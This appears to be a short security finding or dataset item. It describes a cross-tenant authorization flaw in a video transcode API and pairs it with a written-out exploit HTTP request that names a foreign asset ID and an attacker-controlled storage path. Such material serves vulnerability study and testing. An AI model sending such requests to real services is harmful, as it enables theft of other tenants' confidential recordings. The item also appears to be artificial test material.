diagnosis: The background transcode job consumes an arbitrary MediaAsset ID and target storage path from the job payload without re-verifying that the media asset belongs to the initiating tenant. An attacker can inject foreign asset IDs into the queue to transcode and exfiltrate another tenant's confidential video recordings.
exploit_request:
POST /api/media/transcode HTTP/1.1
Host: video-cdn.streamingcloud.com
Authorization: Bearer 44|custtoken778899
Content-Type: application/json

{"asset_id": 9182, "target_path": "tenants/attacker_org/exfiltrated.mp4"}
